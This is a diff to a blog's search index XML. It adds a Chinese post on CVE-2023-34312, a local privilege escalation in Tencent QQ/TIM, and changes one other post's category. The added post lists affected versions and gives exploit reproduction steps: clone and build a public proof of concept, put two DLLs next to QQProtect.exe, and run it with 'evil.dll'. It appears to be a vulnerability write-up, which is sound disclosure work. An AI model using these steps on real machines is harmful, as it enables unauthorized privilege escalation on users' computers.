@@ -4,6 +4,37 @@
   
   
   <entry>
+    <title>CVE-2023-34312 腾讯 QQ / TIM 本地提权漏洞</title>
+    <link href="/posts/5024c62c.html"/>
+    <url>/posts/5024c62c.html</url>
+    
+    <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>QQ 9.7.1.28940 ~ 9.7.8.29039</li><li>TIM 3.4.5.22071 ~ 3.4.7.22084</li><li>（QQProtect.exe 未知版本 ~ 4.5.0.9424）</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="/img/demonstration.gif" title="Github@vi3t1/qq-tim-elevation"></p><h3 id="编译或下载"><a href="#编译或下载" class="headerlink" title="编译或下载"></a>编译或下载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/vi3t1/qq-tim-elevation.git<br>cd poc<br>cargo +stable-i686-pc-windows-msvc build --release --config &quot;build.rustflags = [\&quot;-C\&quot;, \&quot;target-feature=+crt-static\&quot;]&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 编译失败使用下面这个命令</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">cargo +stable-i686-pc-windows-msvc build --release</span><br></code></pre></td></tr></table></figure><p>或从 <a href="https://github.com/savfile/CVE-2023-34312/releases">这里</a> 下载已编译好的版本。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>把两个 DLL 放到 <code>QQProtect.exe</code> 所在的文件夹里。</p><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">QQProtect.exe evil.dll<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>技术</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>漏洞</tag>
+      
+      <tag>漏洞复现</tag>
+      
+      <tag>CVE</tag>
+      
+      <tag>QQ</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>原神怎么你了？</title>
     <link href="/posts/e278d35f.html"/>
     <url>/posts/e278d35f.html</url>
@@ -13,7 +44,7 @@
     
     <categories>
       
-      <category>技术</category>
+      <category>娱乐</category>
       
     </categories>
     
